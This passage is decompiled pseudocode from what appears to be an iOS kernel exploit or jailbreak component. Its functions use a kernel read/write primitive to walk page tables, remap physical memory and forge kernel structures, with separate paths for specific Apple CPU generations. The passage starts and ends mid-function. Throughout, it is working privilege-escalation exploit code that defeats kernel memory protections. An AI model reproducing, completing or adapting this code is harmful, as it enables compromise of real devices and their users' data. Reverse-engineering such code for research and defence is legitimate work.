      *(uint64_t *)(v270 + 16) = 0;
      *(uint64_t *)(v270 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v270 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v270 + 264) = xmmword_431D0;
      *(uint64_t *)(v270 + 280) = 16;
      v271 = v270 + v236;
      *(uint64_t *)v271 = *(uint64_t *)(v233 + 520);
      *(uint64_t *)(v271 + 8) = *(uint64_t *)(v233 + 552);
      *(uint64_t *)(v271 + 16) = 0;
      *(uint64_t *)(v271 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v271 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v271 + 264) = xmmword_431D0;
      *(uint64_t *)(v271 + 280) = 16;
      v272 = v271 + v236;
      *(uint64_t *)v272 = 0;
      *(uint64_t *)(v272 + 240) = *(uint64_t *)(v233 + 432);
      *(uint64_t *)(v272 + 256) = *(uint64_t *)(v233 + 352);
      *(__int128 *)(v272 + 264) = xmmword_431E0;
      *(uint64_t *)(v272 + 280) = 16;
      *v294 = *(uint64_t *)(v233 + 504);
      v294[1] = 0;
      *(uint64_t *)v237 = *(uint64_t *)(v233 + 856);
      *(uint64_t *)(v237 + 160) = 0;
      *(uint64_t *)(v237 + 224) = *(uint64_t *)(v233 + 584) - 8LL;
      *(uint64_t *)(v237 + 240) = *(uint64_t *)(v233 + 432);
      *(uint64_t *)(v237 + 256) = *(uint64_t *)(v233 + 464);
      *(__int128 *)(v237 + 264) = xmmword_431E0;
      *(uint64_t *)(v237 + 280) = 16;
      *v269 = 0;
      v269[1] = *(uint64_t *)(v233 + 368);
      v273 = *(uint64_t *)(v233 + 1048);
      *(uint64_t *)v273 = *(uint64_t *)(v233 + 448);
      *(uint64_t *)(v273 + 8) = *(uint64_t *)(v233 + 416);
      *(uint64_t *)(v273 + 16) = 0;
      *(uint64_t *)(v273 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v273 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v273 + 264) = xmmword_431D0;
      *(uint64_t *)(v273 + 280) = 16;
      v274 = v273 + v236;
      *(uint64_t *)v274 = *(uint64_t *)(v233 + 520);
      *(uint64_t *)(v274 + 8) = *(uint64_t *)(v233 + 416);
      *(uint64_t *)(v274 + 16) = 0;
      *(uint64_t *)(v274 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v274 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v274 + 264) = xmmword_431D0;
      *(uint64_t *)(v274 + 280) = 16;
      v275 = v274 + v236;
      *(uint64_t *)v275 = *(uint64_t *)(v233 + 544);
      *(uint64_t *)(v275 + 8) = *(uint64_t *)(v233 + 872);
      *(uint64_t *)(v275 + 16) = 0;
      *(uint64_t *)(v275 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v275 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v275 + 264) = xmmword_431D0;
      *(uint64_t *)(v275 + 280) = 16;
      v276 = v275 + v236;
      *(uint64_t *)(v276 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v276 + 256) = *(uint64_t *)(v233 + 440);
      *(__int128 *)(v276 + 264) = xmmword_431D0;
      *(uint64_t *)(v276 + 280) = 16;
      v277 = v276 + v236;
      *(uint64_t *)v277 = *(uint64_t *)(v233 + 800);
      *(uint64_t *)(v277 + 8) = *(uint64_t *)(v233 + 808);
      *(uint64_t *)(v277 + 16) = 0;
      *(uint64_t *)(v277 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v277 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v277 + 264) = xmmword_431D0;
      *(uint64_t *)(v277 + 280) = 16;
      v278 = v277 + v236;
      *(uint64_t *)v278 = *(uint64_t *)(v233 + 416) + 224LL;
      *(uint64_t *)(v278 + 16) = 0;
      *(uint64_t *)(v278 + 240) = *(uint64_t *)(v233 + 432);
      *(uint64_t *)(v278 + 256) = *(uint64_t *)(v233 + 472);
      *(__int128 *)(v278 + 264) = xmmword_431D0;
      *(uint64_t *)(v278 + 280) = 16;
      if ( *(uint8_t *)v233 )
      {
        v279 = v242 >> 8;
      }
      else
      {
        v279 = v242 >> 8;
        if ( !(unsigned int)get_kernel_version_build_0(krwCtx, *(uint64_t *)(v233 + 344) + 1LL, v242 >> 8) )
        {
LABEL_417:
          if ( !(unsigned int)krw_read_thunk(krwCtx, *(uint64_t *)(v233 + 792), 8, &v343) )
          {
LABEL_428:
            v1 = 163855;
            goto LABEL_430;
          }
          v280 = 0;
          while ( 1 )
          {
            if ( (uint64_t)v343 == *(uint64_t *)(v233 + 808) )
            {
              v1 = 0;
LABEL_430:
              physmap_unmap_cached(krwCtx, (__int64)inputStruct);
              goto LABEL_431;
            }
            if ( (v280 & 1) == 0 )
            {
              if ( *(uint8_t *)v233 || (*(uint32_t *)(v303 + 912) & 0xF0) != 0 )
              {
                v280 = 0;
                goto LABEL_425;
              }
              get_kernel_version_build_0(krwCtx, *(uint64_t *)(v233 + 840), 0);
            }
            v280 = 1;
LABEL_425:
            semaphore_timedwait_ns(krwCtx, 0x3E8u);
            if ( !(unsigned int)krw_read_thunk(krwCtx, *(uint64_t *)(v233 + 792), 8, &v343) )
              goto LABEL_428;
          }
        }
        *((uint64_t *)v241 + 32) = *(uint64_t *)(v233 + 360);
        *(uint8_t *)v233 = 1;
      }
      setup_macho_section_dispatch(krwCtx, *(uint64_t *)(v233 + 344) + 1LL, v279);
      goto LABEL_417;
    }
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
      v251 = 832;
    else
      v251 = 848;
    v1 = lookup_sptm_state_entry(krwCtx, *(uint64_t *)(v233 + 344), inputStruct);
    if ( (uint32_t)v1 )
      goto LABEL_431;
    v252 = *(uint64_t *)inputStruct;
    v253 = (char *)v234 + inputStruct[0];
    v254 = v253 + 3072;
    v255 = v235 + inputStruct[0] + 3072;
    *((uint64_t *)v253 + 384) = *(uint64_t *)(v233 + 376);
    *((uint64_t *)v253 + 386) = 0;
    *((uint64_t *)v253 + 385) = 0;
    *((uint64_t *)v253 + 414) = *(uint64_t *)(v233 + 368);
    *((uint64_t *)v253 + 415) = v255 + v251;
    if ( *(uint8_t *)v233 )
      v256 = *(uint64_t *)(v233 + 360);
    else
      v256 = *(uint64_t *)(v233 + 360) + 4LL;
    *((uint64_t *)v253 + 416) = v256;
    *(__int128 *)(v253 + 3336) = xmmword_431D0;
    *((uint64_t *)v253 + 419) = 16;
    v257 = &v254[v251];
    *(uint64_t *)v257 = *(uint64_t *)(v233 + 344);
    *((uint64_t *)v257 + 1) = v252;
    *((uint64_t *)v257 + 2) = 0;
    *((uint64_t *)v257 + 30) = *(uint64_t *)(v233 + 368);
    *((uint64_t *)v257 + 32) = *(uint64_t *)(v233 + 360);
    *(__int128 *)&v254[v251 + 264] = xmmword_431D0;
    *((uint64_t *)v257 + 35) = 16;
    v258 = (__int64)&v254[v251 + v251];
    *(uint64_t *)(v258 + 240) = *(uint64_t *)(v233 + 368);
    *(uint64_t *)(v258 + 256) = *(uint64_t *)(v233 + 408);
    *(__int128 *)(v258 + 264) = xmmword_431D0;
    *(uint64_t *)(v258 + 280) = 16;
    v259 = v258 + v251;
    *(uint64_t *)v259 = *(uint64_t *)(v233 + 416) + 264LL;
    *(uint64_t *)(v259 + 8) = *(uint64_t *)(v233 + 760);
    *(uint64_t *)(v259 + 16) = 0;
    *(uint64_t *)(v259 + 240) = *(uint64_t *)(v233 + 368);
    *(uint64_t *)(v259 + 256) = *(uint64_t *)(v233 + 360);
    *(__int128 *)(v259 + 264) = xmmword_431D0;
    *(uint64_t *)(v259 + 280) = 16;
    v260 = v259 + v251;
    *(uint64_t *)v260 = *(uint64_t *)(v233 + 416) + 216LL;
    *(uint64_t *)(v260 + 8) = v252;
    *(uint64_t *)(v260 + 16) = 0;
    *(uint64_t *)(v260 + 240) = *(uint64_t *)(v233 + 368);
    *(uint64_t *)(v260 + 256) = *(uint64_t *)(v233 + 360);
    *(__int128 *)(v260 + 264) = xmmword_431D0;
    *(uint64_t *)(v260 + 280) = 16;
    v261 = (uint64_t *)(v260 + v251);
    *v261 = *(uint64_t *)(v233 + 416) + 200LL;
    v261[1] = v255 + 9 * v251;
    v261[2] = 0;
    v261[30] = *(uint64_t *)(v233 + 368);
    v261[32] = *(uint64_t *)(v233 + 360);
    *(__int128 *)(v260 + v251 + 264) = xmmword_431D0;
    v261[35] = 16;
    v262 = v260 + v251 + v251;
    *(uint64_t *)v262 = *(uint64_t *)(v233 + 392) + 8LL;
    *(uint64_t *)(v262 + 8) = 0;
    *(uint64_t *)(v262 + 16) = 0;
    *(uint64_t *)(v262 + 240) = *(uint64_t *)(v233 + 368);
    *(uint64_t *)(v262 + 256) = *(uint64_t *)(v233 + 360);
    *(__int128 *)(v262 + 264) = xmmword_431D0;
    *(uint64_t *)(v262 + 280) = 16;
    v263 = v262 + v251;
    *(uint64_t *)(v263 + 240) = *(uint64_t *)(v233 + 368);
    *(uint64_t *)(v263 + 256) = *(uint64_t *)(v233 + 424);
    *(__int128 *)(v263 + 264) = xmmword_431D0;
    *(uint64_t *)(v263 + 280) = 16;
    v264 = v263 + v251;
    *(uint64_t *)v264 = *(uint64_t *)(v233 + 400);
    *(__int128 *)(v264 + 8) = xmmword_431F0;
    *(uint64_t *)(v264 + 240) = *(uint64_t *)(v233 + 432);
    *(uint64_t *)(v264 + 256) = *(uint64_t *)(v233 + 360);
    *(__int128 *)(v264 + 264) = xmmword_431D0;
    *(uint64_t *)(v264 + 280) = 16;
    v265 = v264 + v251;
    *(uint64_t *)v265 = *(uint64_t *)(v233 + 800);
    *(uint64_t *)(v265 + 8) = *(uint64_t *)(v233 + 808);
    *(uint64_t *)(v265 + 16) = 0;
    *(uint64_t *)(v265 + 240) = *(uint64_t *)(v233 + 368);
    *(uint64_t *)(v265 + 256) = *(uint64_t *)(v233 + 360);
    *(__int128 *)(v265 + 264) = xmmword_431D0;
    *(uint64_t *)(v265 + 280) = 16;
    v266 = v265 + v251;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14) )
    {
      *(uint64_t *)v266 = *(uint64_t *)(v233 + 816);
      *(uint64_t *)(v266 + 8) = *(uint64_t *)(v233 + 824);
      *(uint64_t *)(v266 + 16) = 0;
      *(uint64_t *)(v266 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v266 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v266 + 264) = xmmword_431D0;
      *(uint64_t *)(v266 + 280) = 16;
      v267 = (uint64_t *)(v266 + v251);
      v267[30] = *(uint64_t *)(v233 + 368);
      v267[32] = *(uint64_t *)(v233 + 440);
      *(__int128 *)(v266 + v251 + 264) = xmmword_431D0;
      v267[35] = 16;
      v266 += v251 + v251;
    }
    *(uint64_t *)v266 = 0;
    *(uint64_t *)(v266 + 256) = *(uint64_t *)(v233 + 352);
    *(__int128 *)(v266 + 264) = xmmword_431E0;
    *(uint64_t *)(v266 + 280) = 16;
    if ( *(uint8_t *)v233 )
    {
      v268 = v255 >> 8;
    }
    else
    {
      v268 = v255 >> 8;
      if ( !(unsigned int)get_kernel_version_build_0(krwCtx, *(uint64_t *)(v233 + 344) + 1LL, v268) )
        goto LABEL_407;
      *((uint64_t *)v254 + 32) = *(uint64_t *)(v233 + 360);
    }
    setup_macho_section_dispatch(krwCtx, *(uint64_t *)(v233 + 344) + 1LL, v268);
    while ( 1 )
    {
LABEL_407:
      if ( !(unsigned int)krw_read_thunk(krwCtx, *(uint64_t *)(v233 + 792), 8, src_address) )
      {
        v1 = 163855;
        goto LABEL_431;
      }
      if ( src_address[0] == *(uint64_t *)(v233 + 808) )
        break;
      semaphore_timedwait_ns(krwCtx, 0x3E8u);
    }
    v1 = 0;
LABEL_431:
    if ( (uint32_t)v1 )
      goto LABEL_27;
    v1 = 708617;
    v281 = krwCtx->dmaFailCtx;
    *(uint32_t *)inputStruct = 552;
    if ( krwCtx->mappedKernelRegion_size8byte && krwCtx->mappedKernelSize_size8byte )
    {
      v282 = alloc_physmap_page(krwCtx, (unsigned int *)inputStruct);
      if ( !v282 )
        goto LABEL_27;
      v283 = v282;
      if ( !(unsigned int)kwrite_with_retry(krwCtx, v282, v281 + 760, *(unsigned int *)inputStruct) )
      {
        v1 = 163856;
        goto LABEL_27;
      }
      *(uint64_t *)(krwCtx->mappedKernelRegion_size8byte + 352LL) = v283;
    }
    return 0;
  }
  v1 = 708617;
  v202 = krwCtx->dmaFailCtx;
  v203 = *(uint64_t *)(v202 + 600);
  v204 = *(uint64_t *)(v202 + 608);
  LODWORD(size[0]) = 0x4000;
  if ( !(unsigned int)krw_read_thunk(krwCtx, *(uint64_t *)(v202 + 592), 8, &outputStruct)
    || (v205 = (uint64_t *)krwCtx->dmaFailCtx,
        v206 = v205[74],
        v207 = v205[96],
        LODWORD(input[0]) = 0x4000,
        !(unsigned int)krw_read_thunk(krwCtx, v206, 8, v316))
    || (v208 = read_cryptex_manifest(krwCtx, *(uint64_t *)v316 & 0xFFFFFFFFC000LL)) == 0
    || !(unsigned int)krw_read_thunk(krwCtx, v208, 8, address)
    || (v209 = read_cryptex_manifest(krwCtx, address[0] & 0xFFFFFFFFC000LL)) == 0 )
  {
LABEL_370:
    v1 = v47;
    goto LABEL_27;
  }
  v210 = v209;
  v301 = alloc_physmap_scratch_page(krwCtx, input);
  if ( !v301 )
    goto LABEL_27;
  pgtable_walk_wrapper(krwCtx, v301 & ~krwCtx->pageMask, (__int64)&v343);
  if ( !v211 )
    goto LABEL_369;
  v212 = v345 & 0xFFFFFFFFC000LL;
  if ( (v345 & 0xFFFFFFFFC000LL) == 0 )
    goto LABEL_369;
  v296 = alloc_physmap_scratch_page(krwCtx, input);
  if ( !v296 )
  {
    v47 = 708617;
LABEL_369:
    map_shared_mem_and_transfer_data(krwCtx, v301, LODWORD(input[0]));
    goto LABEL_370;
  }
  pgtable_walk_wrapper(krwCtx, v296 & ~krwCtx->pageMask, (__int64)&v343);
  if ( !v213 || (v291 = v345 & 0xFFFFFFFFC000LL, (v345 & 0xFFFFFFFFC000LL) == 0) )
  {
LABEL_368:
    map_shared_mem_and_transfer_data(krwCtx, v296, LODWORD(input[0]));
    goto LABEL_369;
  }
  *(uint64_t *)v316 = (*(uint64_t *)v316 & 0xFFFF000000003FFFLL) | v212;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, v207, (__int64)v316, 8)
    || (address[0] = (address[0] & 0xFFFF000000003FFFLL) | v291,
        !(unsigned int)kwrite_with_retry(krwCtx, v301, (__int64)address, 8)) )
  {
LABEL_367:
    v47 = 163856;
    goto LABEL_368;
  }
  for ( i = 0; i != 0x4000; i += 8 )
  {
    if ( !(unsigned int)krw_read_thunk(krwCtx, v210 + i, 8, target_address) )
      goto LABEL_368;
    if ( target_address[0] && !(unsigned int)kwrite_with_retry(krwCtx, v296 + i, (__int64)target_address, 8) )
      goto LABEL_367;
  }
  v205[159] = v301;
  v205[160] = v296;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 536), v202 + 880);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = setup_physmap_rw_multi(krwCtx, *(uint64_t *)(v202 + 544), *(uint64_t *)(v202 + 760));
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 560), v202 + 936);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 568), v202 + 992);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 576), v202 + 1048);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 584), v202 + 1104);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 528) & ~krwCtx->pageMask, v202 + 1160);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  *(uint64_t *)((krwCtx->pageMask & *(uint64_t *)(v202 + 528)) + *(uint64_t *)(v202 + 1160)) = 16424;
  v302 = (__int64 *)calloc(0x800u, 8u);
  if ( !v302 )
  {
    v1 = 708617;
    goto LABEL_27;
  }
  v215 = 0;
  *(uint64_t *)v297 = *(uint64_t *)(v202 + 304) - *(uint64_t *)(v202 + 272);
  while ( 2 )
  {
    v216 = alloc_physmap_page(krwCtx, (unsigned int *)size);
    if ( !v216 )
    {
      v1 = 708617;
      goto LABEL_378;
    }
    v217 = v216;
    pgtable_walk_wrapper(krwCtx, v216 & ~krwCtx->pageMask, (__int64)&v343);
    v218 = v345 & 0xFFFFFFFFC000LL;
    if ( v219 )
      v220 = v218 == 0;
    else
      v220 = 1;
    if ( v220 )
    {
      v1 = 0xFFFFFFFFLL;
      goto LABEL_378;
    }
    v221 = v218 + *(uint64_t *)v297;
    if ( (unsigned __int64)(v218 + *(uint64_t *)v297 + 0x7FFDFFFFFFLL) < 0xFFDFFFFFFLL )
      goto LABEL_356;
    v302[v215++] = v217;
    if ( v215 != 2048 )
      continue;
    break;
  }
  if ( !v221 )
  {
    v1 = 0xFFFFFFFFLL;
LABEL_379:
    v229 = (unsigned int)v215;
    v230 = v302;
    do
    {
      v231 = *v230++;
      map_shared_mem_and_transfer_data(krwCtx, v231, LODWORD(size[0]));
      --v229;
    }
    while ( v229 );
LABEL_381:
    free(v302);
    if ( (uint32_t)v1 )
      goto LABEL_27;
    goto LABEL_382;
  }
LABEL_356:
  v289 = krwCtx->pageMask;
  v292 = *(uint64_t *)(v202 + 416);
  v298 = read_pgtable_entry(krwCtx, v292, 0, 1);
  if ( !v298 )
  {
    v1 = 0xFFFFFFFFLL;
    goto LABEL_377;
  }
  *(__int128 *)&v339[16] = 0u;
  *(__int128 *)v339 = 0u;
  v338 = 0u;
  v337 = 0u;
  v336 = 0u;
  v335 = 0u;
  v334 = 0u;
  v333 = 0u;
  v332 = 0u;
  v331 = 0u;
  v330 = 0u;
  v329 = 0u;
  v328 = 0u;
  v327 = 0u;
  v326 = 0u;
  *(__int128 *)&inputStruct[8] = 0u;
  v222 = *(uint64_t *)(v202 + 536);
  *(uint64_t *)inputStruct = *(uint64_t *)(v202 + 368);
  *(uint64_t *)&v337 = v222;
  v223 = *(uint64_t *)(v202 + 560);
  *((uint64_t *)&v337 + 1) = *(uint64_t *)(v202 + 480);
  *(uint64_t *)&v338 = v223;
  DWORD2(v338) = 819796357;
  *(uint32_t *)v339 = 3145728;
  *(__int128 *)&v339[8] = xmmword_43190;
  v224 = *(uint64_t *)(v202 + 760);
  *(uint64_t *)v293 = v289 & v292;
  v341 = *(uint64_t *)(v202 + 456);
  v340 = v224;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, *(uint64_t *)v293 + v217, (__int64)inputStruct, 280) )
  {
    v1 = 163856;
    goto LABEL_377;
  }
  v225 = *(uint64_t *)v293 + v221;
  v1 = setup_physmap_rw_multi(krwCtx, v225 & ~krwCtx->pageMask, v218);
  if ( (uint32_t)v1 )
  {
LABEL_377:
    map_shared_mem_and_transfer_data(krwCtx, v217, LODWORD(size[0]));
LABEL_378:
    if ( !(uint32_t)v215 )
      goto LABEL_381;
    goto LABEL_379;
  }
  v226 = *(uint64_t *)(v202 + 480);
  src_address[0] = *(uint64_t *)(v202 + 488);
  src_address[1] = 964;
  v227 = *(uint64_t *)(v202 + 568) + (unsigned int)(krwCtx->pageSizeOrSomething - 16);
  memset(&src_address[28], 0, 56);
  memset(&src_address[2], 0, 184);
  src_address[25] = v227;
  *(__int128 *)&src_address[26] = v226;
  v1 = setup_physmap_page_with_size(krwCtx, *(uint64_t *)(v202 + 552), v202 + 1216);
  if ( !(uint32_t)v1 )
  {
    memcpy(*(void **)(v202 + 1216), src_address, 0x118u);
    *(uint32_t *)(v203 + 16192) = 16;
    *(uint64_t *)(v203 + 16200) = v204 + 16208;
    *(uint64_t *)(v203 + 16208) = v225 >> 14;
    *(uint64_t *)(v203 + 16216) = v298 >> 14;
    *(__int128 *)(v203 + 16224) = xmmword_431A0;
    v228 = vdupq_n_s64(v204);
    *(uint32_t *)(v203 + 16288) = 36;
    *(uint64_t *)(v203 + 16296) = *(uint64_t *)(v202 + 512);
    *(int64x2_t *)(v202 + 832) = vaddq_s64(v228, (int64x2_t)xmmword_431C0);
    *(int64x2_t *)(v202 + 848) = vaddq_s64(v228, (int64x2_t)xmmword_431B0);
    *(uint64_t *)(v202 + 864) = v225;
    *(uint64_t *)(v202 + 872) = outputStruct;
    goto LABEL_378;
  }
LABEL_27:
  krwCtx->dmaFailCtx = 0;
  free(v4);
  return v1;
}
// 16B40: variable 'v87' is possibly undefined
// 16B68: variable 'v89' is possibly undefined
// 17804: variable 'v183' is possibly undefined
// 1785C: variable 'v187' is possibly undefined
// 17890: variable 'v189' is possibly undefined
// 178CC: variable 'v190' is possibly undefined
// 17904: variable 'v191' is possibly undefined
// 17924: variable 'v192' is possibly undefined
// 17A20: variable 'v197' is possibly undefined
// 17A68: variable 'v198' is possibly undefined
// 17CCC: variable 'v211' is possibly undefined
// 17D08: variable 'v213' is possibly undefined
// 17EF0: variable 'v219' is possibly undefined
// 42FA0: using guessed type __int128 xmmword_42FA0;
// 42FB0: using guessed type __int128 xmmword_42FB0;
// 42FC0: using guessed type __int128 xmmword_42FC0;
// 42FD0: using guessed type __int128 xmmword_42FD0;
// 42FE0: using guessed type __int128 xmmword_42FE0;
// 42FF0: using guessed type __int128 xmmword_42FF0;
// 43000: using guessed type __int128 xmmword_43000;
// 43010: using guessed type __int128 xmmword_43010;
// 43020: using guessed type __int128 xmmword_43020;
// 43030: using guessed type __int128 xmmword_43030;
// 43040: using guessed type __int128 xmmword_43040;
// 43050: using guessed type __int128 xmmword_43050;
// 43060: using guessed type __int128 xmmword_43060;
// 43070: using guessed type __int128 xmmword_43070;
// 43080: using guessed type __int128 xmmword_43080;
// 43090: using guessed type __int128 xmmword_43090;
// 430A0: using guessed type __int128 xmmword_430A0;
// 430B0: using guessed type __int128 xmmword_430B0;
// 430C0: using guessed type __int128 xmmword_430C0;
// 430D0: using guessed type __int128 xmmword_430D0;
// 430E0: using guessed type __int128 xmmword_430E0;
// 430F0: using guessed type __int128 xmmword_430F0;
// 43100: using guessed type __int128 xmmword_43100;
// 43110: using guessed type __int128 xmmword_43110;
// 43120: using guessed type __int128 xmmword_43120;
// 43130: using guessed type __int128 xmmword_43130;
// 43140: using guessed type __int128 xmmword_43140;
// 43150: using guessed type __int128 xmmword_43150;
// 43160: using guessed type __int128 xmmword_43160;
// 43170: using guessed type __int128 xmmword_43170;
// 43180: using guessed type __int128 xmmword_43180;
// 43190: using guessed type __int128 xmmword_43190;
// 431A0: using guessed type __int128 xmmword_431A0;
// 431B0: using guessed type __int128 xmmword_431B0;
// 431C0: using guessed type __int128 xmmword_431C0;
// 431D0: using guessed type __int128 xmmword_431D0;
// 431E0: using guessed type __int128 xmmword_431E0;
// 431F0: using guessed type __int128 xmmword_431F0;
// 43750: using guessed type __int128 xmmword_43750;

//----- (0000000000018B14) ----------------------------------------------------
unsigned __int64 __fastcall read_cryptex_manifest(struct_krwCtx *krwCtx, unsigned __int64 a2)
{
  __int64 v2; // x20
  struct_krwCtx *v3; // x21
  unsigned __int64 v4; // x19
  unsigned __int64 v5; // x23
  int v6; // w22
  int v7; // w24
  int has_flag; // w0
  unsigned __int64 v10; // x0
  __int64 v11; // x28
  __int64 v12; // x26
  __int64 v13; // x27
  unsigned __int64 v14; // x8
  __int64 v15; // x0
  unsigned __int64 v16; // x8
  unsigned __int64 v17; // x9
  bool v18; // zf
  __int64 v19; // x22
  __int64 v20; // x0
  __int64 v22; // [xsp+8h] [xbp-4078h] BYREF
  __int64 v23; // [xsp+10h] [xbp-4070h] BYREF
  __int64 v24; // [xsp+18h] [xbp-4068h] BYREF
  uint64_t v25[2048]; // [xsp+20h] [xbp-4060h] BYREF

  v2 = a2;
  v3 = krwCtx;
  v4 = krwCtx->gap_0x19E8;
  v5 = krwCtx->gap_0x19F0;
  v6 = number_of_cpus();
  if ( krw_ctx_has_flag(v3, KRW_CTX_FLAG_CPU_A16_A17_MASK | KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) )
  {
    v7 = 2047;
  }
  else
  {
    has_flag = krw_ctx_has_flag(v3, KRW_CTX_FLAG_CPU_A14 | KRW_CTX_FLAG_CPU_A15);
    if ( v6 <= 7 || !has_flag )
      v7 = 7;
    else
      v7 = 2047;
  }
  v10 = krw_lookup_and_process_entry(v3);
  if ( v10 && (unsigned int)krw_read_thunk(v3, v10, 8, &v24) )
  {
    if ( v4 < v5 )
    {
      v11 = 0;
      v12 = 0;
      v13 = 0;
      while ( 1 )
      {
        v14 = *(uint64_t *)&v7 & (v4 >> 36);
        if ( v24 + 8 * v14 != v12 )
        {
          v12 = v24 + 8 * v14;
          if ( !(unsigned int)krw_read_thunk(v3, v12, 8, &v23) )
            return 0;
        }
        if ( (v23 & 1) == 0 )
          break;
        v15 = resolve_physpage_addr(v3, v23 & 0xFFFFFFFFC000LL);
        if ( !v15 )
          break;
        v19 = v15 + ((v4 >> 22) & 0x3FF8);
        if ( v11 != v19 )
        {
          v11 = v15 + ((v4 >> 22) & 0x3FF8);
          if ( !(unsigned int)krw_read_thunk(v3, v19, 8, &v22) )
            return 0;
        }
        if ( (v22 & 1) == 0 )
          goto LABEL_29;
        if ( (v22 & 2) == 0 && (v22 & 0xFFFFFE000000LL) == v2 )
          return v4;
        v20 = resolve_physpage_addr(v3, v22 & 0xFFFFFFFFC000LL);
        if ( !v20 )
        {
LABEL_29:
          v16 = v4 + 0x2000000;
          v17 = (v4 + 0x2000000) & 0xFFFFFFFFFE000000LL;
          v18 = v17 == 0;
LABEL_18:
          if ( v18 )
            v4 = v16;
          else
            v4 = v17;
          goto LABEL_21;
        }
        if ( v13 != v20 )
        {
          v13 = v20;
          if ( !(unsigned int)krw_read_thunk(v3, v20, 0x4000, v25) )
            return 0;
        }
        if ( (v25[(v4 >> 14) & 0x7FF] & 0xFFFFFFFFC000LL) == v2 )
        {
          v4 |= 0xFFFFF00000000000LL;
          return v4;
        }
        v4 += (unsigned int)v3->pageSizeOrSomething;
LABEL_21:
        if ( v4 >= v5 )
          goto LABEL_34;
      }
      v16 = v4 + 0x1000000000LL;
      v17 = (v4 + 0x1000000000LL) & 0xFFFFFFF000000000LL;
      v18 = v17 == 0;
      goto LABEL_18;
    }
LABEL_34:
    if ( v4 - 1 == v5 )
      return 0;
  }
  return v4;
}
// 18B4C: variable 'v1' is possibly undefined
// 48940: using guessed type __int64 __chkstk_darwin(void);
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (0000000000018D68) ----------------------------------------------------
char *__fastcall scan_physmap_state_entries(struct_krwCtx *krwCtx, uint32_t *a2, uint32_t *a3, unsigned __int64 a4)
{
  __int64 v4; // x8
  char *result; // x0
  char *v6; // x8
  char *v7; // x11
  __int64 v9; // x11

  v4 = krwCtx->dmaFailCtx;
  result = *(char **)(v4 + 328);
  v6 = &result[*(uint64_t *)(v4 + 336)];
  if ( result >= v6 )
    return 0LL;
  while ( (*a3 & *(uint32_t *)result) != *a2 )
  {
LABEL_12:
    result += 4;
    if ( result >= v6 )
      return 0LL;
  }
  v7 = &result[4 * a4];
  if ( v7 < v6 && a4 >= 2 )
  {
    v9 = 1LL;
    while ( (a3[v9] & *(uint32_t *)&result[4 * v9]) == a2[v9] )
    {
      if ( a4 == ++v9 )
        return result;
    }
    goto LABEL_12;
  }
  if ( v7 >= v6 )
    return 0LL;
  return result;
}

//----- (0000000000018DF0) ----------------------------------------------------
__int64 __fastcall lookup_sptm_state_entry(struct_krwCtx *krwCtx, unsigned __int64 a2, uint64_t *a3)
{
  // struct_krwCtx *krwCtx; // x20
  uint64_t *v4; // x9
  unsigned __int64 v5; // x8
  __int64 v6; // x8
  unsigned __int64 v7; // x10
  __int64 v8; // x20
  __int64 v10; // [xsp+8h] [xbp-18h] BYREF

  v4 = krwCtx->dmaFailCtx;
  v5 = v4[37];
  if ( v5 > a2 || v4[39] + v5 <= a2 )
    v6 = 0;
  else
    v6 = a2 - v5 + v4[31];
  v7 = v4[38];
  if ( v7 <= a2 && v4[40] + v7 > a2 )
    v6 = a2 - v7 + v4[32];
  v8 = 163855;
  if ( v6 && (unsigned int)krw_read_thunk(krwCtx, v6, 8, &v10) )
  {
    v8 = 0;
    *a3 = v10;
  }
  return v8;
}

//----- (0000000000018EA4) ----------------------------------------------------
unsigned __int64 __fastcall read_pgtable_entry(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 *a3, char a4)
{
  unsigned __int64 result; // x0
  __int64 v9; // x23
  __int64 v10; // [xsp+8h] [xbp-48h] BYREF
  __int64 v11; // [xsp+10h] [xbp-40h] BYREF
  __int64 v12; // [xsp+18h] [xbp-38h] BYREF

  if ( !(unsigned int)krw_read_thunk(
                        krwCtx,
                        *(uint64_t *)(krwCtx->dmaFailCtx + 592LL) + ((a2 >> 33) & 0x38),
                        8,
                        &v12)
    || (v12 & 1) == 0 )
  {
    return 0;
  }
  if ( (a4 & 1) != 0 )
  {
    result = read_cryptex_manifest(krwCtx, v12 & 0xFFFFFFFFC000LL);
    if ( !result )
      return result;
  }
  else
  {
    result = resolve_physpage_addr(krwCtx, v12 & 0xFFFFFFFFC000LL);
    if ( !result )
      return result;
  }
